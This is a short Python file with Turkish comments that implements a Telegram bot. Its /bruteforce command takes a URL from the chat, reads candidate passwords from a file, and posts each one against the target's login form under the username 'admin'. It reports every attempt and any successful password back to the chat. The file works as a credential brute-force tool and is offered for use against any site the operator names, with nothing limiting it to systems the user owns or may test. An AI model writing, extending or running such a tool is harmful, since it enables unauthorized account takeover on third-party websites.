import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import time

# Bot Tokeninizi buraya girin
TOKEN = 'YOUR_BOT_TOKEN'

# Brute-force saldırısı için deneme yapacak kullanıcı adı ve şifre listesi
def brute_force(update: Update, context: CallbackContext) -> None:
    url = ' '.join(context.args)
    if not url:
        update.message.reply_text("Lütfen bir URL girin.")
        return
    
    # sifreler.txt dosyasından şifreleri okuma
    with open('sifreler.txt', 'r') as f:
        passwords = f.readlines()

    # Sırasıyla şifreleri deneme
    found = False
    for pwd in passwords:
        pwd = pwd.strip()  # Şifreden boşlukları kaldır
        update.message.reply_text(f"Deniyor: {pwd}")
        
        # Giriş yapma işlemi
        payload = {'username': 'admin', 'password': pwd}  # Değiştirilebilir
        response = requests.post(url, data=payload)
        
        # Eğer giriş başarılıysa (örneğin "success" kelimesini içeriyorsa)
        if "success" in response.text.lower():
            update.message.reply_text(f"Giriş başarılı! Kullanıcı: admin, Şifre: {pwd}")
            found = True
            break
        time.sleep(1)  # Denemeler arasında 1 saniye bekle

    if not found:
        update.message.reply_text("Brute force denemeleri başarısız oldu.")

# Telegram botunu başlat
def main():
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("bruteforce", brute_force))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
